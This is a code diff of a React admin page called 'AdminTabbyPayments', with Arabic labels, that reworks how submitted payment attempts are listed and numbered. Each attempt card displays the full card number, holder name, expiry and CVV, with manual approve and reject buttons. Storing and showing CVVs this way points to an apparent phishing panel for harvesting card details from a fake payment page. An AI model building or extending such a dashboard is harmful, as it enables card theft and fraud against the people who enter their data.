@@ -490,134 +490,45 @@ const AdminTabbyPayments = () => {
                     </div>
 
                     {/* جميع محاولات الدفع (البطاقة الأساسية + المحاولات الإضافية) */}
-                    {payment.card_number && (
+                    {(payment.card_number || paymentAttempts[payment.id]) && (
                       <div className="mb-6">
                         <h3 className="font-semibold flex items-center gap-2 text-sm text-orange-600 mb-3">
                           <CreditCard className="h-4 w-4" />
-                          محاولات الدفع ({1 + (paymentAttempts[payment.id]?.length || 0)})
+                          محاولات الدفع ({(payment.card_number && payment.card_number !== '0000000000000000' ? 1 : 0) + (paymentAttempts[payment.id]?.length || 0)})
                         </h3>
                         <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
-                          {/* البطاقة الأساسية - المحاولة الأولى */}
-                          <div 
-                            className={`rounded-lg p-3 border-2 ${
-                              payment.payment_status === 'rejected' 
-                                ? 'bg-red-50 border-red-400' 
-                                : payment.payment_status === 'approved'
-                                ? 'bg-green-50 border-green-400'
-                                : 'bg-blue-50 border-blue-400'
-                            }`}
-                          >
-                            <div className="flex justify-between items-center mb-2">
-                              <span className={`text-xs font-bold ${
-                                payment.payment_status === 'rejected' 
-                                  ? 'text-red-700' 
-                                  : payment.payment_status === 'approved'
-                                  ? 'text-green-700'
-                                  : 'text-blue-600'
-                              }`}>
-                                محاولة #1 (الأساسية)
-                              </span>
-                              {payment.payment_status === 'approved' && (
-                                <Badge className="bg-green-600 text-xs">
-                                  ✓ موافق عليها
-                                </Badge>
-                              )}
-                              {payment.payment_status === 'rejected' && (
-                                <Badge className="bg-red-600 text-xs">
-                                  ✗ مرفوضة
-                                </Badge>
-                              )}
-                              {payment.payment_status === 'pending' && (
-                                <Badge className="bg-yellow-500 text-xs">
-                                  ⏳ قيد الانتظار
-                                </Badge>
-                              )}
-                            </div>
-                            <div className="space-y-1.5 text-xs">
-                              <div className="flex justify-between">
-                                <span className="text-gray-500">رقم البطاقة:</span>
-                                <span className="font-mono font-medium" dir="ltr">
-                                  {payment.card_number}
-                                </span>
-                              </div>
-                              <div className="flex justify-between">
-                                <span className="text-gray-500">الاسم:</span>
-                                <span className="font-medium truncate max-w-[120px]" title={payment.cardholder_name}>
-                                  {payment.cardholder_name}
-                                </span>
-                              </div>
-                              <div className="flex justify-between">
-                                <span className="text-gray-500">الانتهاء:</span>
-                                <span className="font-medium" dir="ltr">{payment.expiry_date}</span>
-                              </div>
-                              <div className="flex justify-between">
-                                <span className="text-gray-500">CVV:</span>
-                                <span className="font-mono font-medium">{payment.cvv}</span>
-                              </div>
-                              <div className="text-xs text-gray-500 text-center mt-2 pt-2 border-t border-blue-200">
-                                {format(new Date(payment.created_at), 'PPp', { locale: ar })}
-                              </div>
-                            </div>
-
-                            {payment.payment_status === 'pending' && (
-                              <div className="flex gap-2 mt-3 pt-3 border-t border-blue-300">
-                                <Button
-                                  onClick={() => handleApproveMainCard(payment.id)}
-                                  disabled={processing === payment.id}
-                                  className="flex-1 bg-green-600 hover:bg-green-700 text-white h-8 text-xs"
-                                >
-                                  {processing === payment.id ? (
-                                    <Loader2 className="h-3 w-3 animate-spin ml-1" />
-                                  ) : (
-                                    <Check className="h-3 w-3 ml-1" />
-                                  )}
-                                  موافقة
-                                </Button>
-                                <Button
-                                  onClick={() => handleRejectMainCard(payment.id)}
-                                  disabled={processing === payment.id}
-                                  variant="destructive"
-                                  className="flex-1 h-8 text-xs"
-                                >
-                                  {processing === payment.id ? (
-                                    <Loader2 className="h-3 w-3 animate-spin ml-1" />
-                                  ) : (
-                                    <X className="h-3 w-3 ml-1" />
-                                  )}
-                                  رفض
-                                </Button>
-                              </div>
-                            )}
-                          </div>
-
-                          {/* المحاولات الإضافية */}
-                          {paymentAttempts[payment.id] && paymentAttempts[payment.id].map((attempt, index) => (
+                          {/* البطاقة الأساسية - المحاولة الأولى - فقط إذا كانت تحتوي على بيانات حقيقية */}
+                          {payment.card_number && payment.card_number !== '0000000000000000' && (
                             <div 
-                              key={attempt.id} 
                               className={`rounded-lg p-3 border-2 ${
-                                attempt.approval_status === 'rejected' 
+                                payment.payment_status === 'rejected' 
                                   ? 'bg-red-50 border-red-400' 
-                                  : attempt.approval_status === 'approved'
+                                  : payment.payment_status === 'approved'
                                   ? 'bg-green-50 border-green-400'
-                                  : 'bg-orange-50 border-orange-200'
+                                  : 'bg-blue-50 border-blue-400'
                               }`}
                             >
                               <div className="flex justify-between items-center mb-2">
                                 <span className={`text-xs font-bold ${
-                                  attempt.approval_status === 'rejected' 
+                                  payment.payment_status === 'rejected' 
                                     ? 'text-red-700' 
-                                    : attempt.approval_status === 'approved'
+                                    : payment.payment_status === 'approved'
                                     ? 'text-green-700'
-                                    : 'text-orange-600'
+                                    : 'text-blue-600'
                                 }`}>
-                                  محاولة #{index + 2}
+                                  محاولة #1 (الأساسية)
                                 </span>
-                                {attempt.approval_status && (
-                                  <Badge className={attempt.approval_status === 'approved' ? 'bg-green-600 text-xs' : 'bg-red-600 text-xs'}>
-                                    {attempt.approval_status === 'approved' ? '✓ موافق عليها' : '✗ مرفوضة'}
+                                {payment.payment_status === 'approved' && (
+                                  <Badge className="bg-green-600 text-xs">
+                                    ✓ موافق عليها
                                   </Badge>
                                 )}
-                                {!attempt.approval_status && (
+                                {payment.payment_status === 'rejected' && (
+                                  <Badge className="bg-red-600 text-xs">
+                                    ✗ مرفوضة
+                                  </Badge>
+                                )}
+                                {payment.payment_status === 'pending' && (
                                   <Badge className="bg-yellow-500 text-xs">
                                     ⏳ قيد الانتظار
                                   </Badge>
@@ -627,36 +538,36 @@ const AdminTabbyPayments = () => {
                                 <div className="flex justify-between">
                                   <span className="text-gray-500">رقم البطاقة:</span>
                                   <span className="font-mono font-medium" dir="ltr">
-                                    {attempt.card_number}
+                                    {payment.card_number}
                                   </span>
                                 </div>
                                 <div className="flex justify-between">
                                   <span className="text-gray-500">الاسم:</span>
-                                  <span className="font-medium truncate max-w-[120px]" title={attempt.cardholder_name}>
-                                    {attempt.cardholder_name}
+                                  <span className="font-medium truncate max-w-[120px]" title={payment.cardholder_name}>
+                                    {payment.cardholder_name}
                                   </span>
                                 </div>
                                 <div className="flex justify-between">
                                   <span className="text-gray-500">الانتهاء:</span>
-                                  <span className="font-medium" dir="ltr">{attempt.expiry_date}</span>
+                                  <span className="font-medium" dir="ltr">{payment.expiry_date}</span>
                                 </div>
                                 <div className="flex justify-between">
                                   <span className="text-gray-500">CVV:</span>
-                                  <span className="font-mono font-medium">{attempt.cvv}</span>
+                                  <span className="font-mono font-medium">{payment.cvv}</span>
                                 </div>
-                                <div className="text-xs text-gray-500 text-center mt-2 pt-2 border-t border-orange-200">
-                                  {format(new Date(attempt.created_at), 'PPp', { locale: ar })}
+                                <div className="text-xs text-gray-500 text-center mt-2 pt-2 border-t border-blue-200">
+                                  {format(new Date(payment.created_at), 'PPp', { locale: ar })}
                                 </div>
                               </div>
 
-                              {!attempt.approval_status && (
-                                <div className="flex gap-2 mt-3 pt-3 border-t border-orange-300">
+                              {payment.payment_status === 'pending' && (
+                                <div className="flex gap-2 mt-3 pt-3 border-t border-blue-300">
                                   <Button
-                                    onClick={() => handleApprovePaymentAttempt(attempt.id, payment.id)}
-                                    disabled={processing === attempt.id}
+                                    onClick={() => handleApproveMainCard(payment.id)}
+                                    disabled={processing === payment.id}
                                     className="flex-1 bg-green-600 hover:bg-green-700 text-white h-8 text-xs"
                                   >
-                                    {processing === attempt.id ? (
+                                    {processing === payment.id ? (
                                       <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                     ) : (
                                       <Check className="h-3 w-3 ml-1" />
@@ -664,12 +575,12 @@ const AdminTabbyPayments = () => {
                                     موافقة
                                   </Button>
                                   <Button
-                                    onClick={() => handleRejectPaymentAttempt(attempt.id, payment.id)}
-                                    disabled={processing === attempt.id}
+                                    onClick={() => handleRejectMainCard(payment.id)}
+                                    disabled={processing === payment.id}
                                     variant="destructive"
                                     className="flex-1 h-8 text-xs"
                                   >
-                                    {processing === attempt.id ? (
+                                    {processing === payment.id ? (
                                       <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                     ) : (
                                       <X className="h-3 w-3 ml-1" />
@@ -679,7 +590,103 @@ const AdminTabbyPayments = () => {
                                 </div>
                               )}
                             </div>
-                          ))}
+                          )}
+
+                          {/* المحاولات الإضافية */}
+                          {paymentAttempts[payment.id] && paymentAttempts[payment.id].map((attempt, index) => {
+                            // حساب الرقم الصحيح للمحاولة
+                            const attemptNumber = (payment.card_number && payment.card_number !== '0000000000000000' ? 2 : 1) + index;
+                            
+                            return (
+                              <div 
+                                key={attempt.id} 
+                                className={`rounded-lg p-3 border-2 ${
+                                  attempt.approval_status === 'rejected' 
+                                    ? 'bg-red-50 border-red-400' 
+                                    : attempt.approval_status === 'approved'
+                                    ? 'bg-green-50 border-green-400'
+                                    : 'bg-orange-50 border-orange-200'
+                                }`}
+                              >
+                                <div className="flex justify-between items-center mb-2">
+                                  <span className={`text-xs font-bold ${
+                                    attempt.approval_status === 'rejected' 
+                                      ? 'text-red-700' 
+                                      : attempt.approval_status === 'approved'
+                                      ? 'text-green-700'
+                                      : 'text-orange-600'
+                                  }`}>
+                                    محاولة #{attemptNumber}
+                                  </span>
+                                  {attempt.approval_status && (
+                                    <Badge className={attempt.approval_status === 'approved' ? 'bg-green-600 text-xs' : 'bg-red-600 text-xs'}>
+                                      {attempt.approval_status === 'approved' ? '✓ موافق عليها' : '✗ مرفوضة'}
+                                    </Badge>
+                                  )}
+                                  {!attempt.approval_status && (
+                                    <Badge className="bg-yellow-500 text-xs">
+                                      ⏳ قيد الانتظار
+                                    </Badge>
+                                  )}
+                                </div>
+                                <div className="space-y-1.5 text-xs">
+                                  <div className="flex justify-between">
+                                    <span className="text-gray-500">رقم البطاقة:</span>
+                                    <span className="font-mono font-medium" dir="ltr">
+                                      {attempt.card_number}
+                                    </span>
+                                  </div>
+                                  <div className="flex justify-between">
+                                    <span className="text-gray-500">الاسم:</span>
+                                    <span className="font-medium truncate max-w-[120px]" title={attempt.cardholder_name}>
+                                      {attempt.cardholder_name}
+                                    </span>
+                                  </div>
+                                  <div className="flex justify-between">
+                                    <span className="text-gray-500">الانتهاء:</span>
+                                    <span className="font-medium" dir="ltr">{attempt.expiry_date}</span>
+                                  </div>
+                                  <div className="flex justify-between">
+                                    <span className="text-gray-500">CVV:</span>
+                                    <span className="font-mono font-medium">{attempt.cvv}</span>
+                                  </div>
+                                  <div className="text-xs text-gray-500 text-center mt-2 pt-2 border-t border-orange-200">
+                                    {format(new Date(attempt.created_at), 'PPp', { locale: ar })}
+                                  </div>
+                                </div>
+
+                                {!attempt.approval_status && (
+                                  <div className="flex gap-2 mt-3 pt-3 border-t border-orange-300">
+                                    <Button
+                                      onClick={() => handleApprovePaymentAttempt(attempt.id, payment.id)}
+                                      disabled={processing === attempt.id}
+                                      className="flex-1 bg-green-600 hover:bg-green-700 text-white h-8 text-xs"
+                                    >
+                                      {processing === attempt.id ? (
+                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
+                                      ) : (
+                                        <Check className="h-3 w-3 ml-1" />
+                                      )}
+                                      موافقة
+                                    </Button>
+                                    <Button
+                                      onClick={() => handleRejectPaymentAttempt(attempt.id, payment.id)}
+                                      disabled={processing === attempt.id}
+                                      variant="destructive"
+                                      className="flex-1 h-8 text-xs"
+                                    >
+                                      {processing === attempt.id ? (
+                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
+                                      ) : (
+                                        <X className="h-3 w-3 ml-1" />
+                                      )}
+                                      رفض
+                                    </Button>
+                                  </div>
+                                )}
+                              </div>
+                            );
+                          })}
                         </div>
                       </div>
                     )}
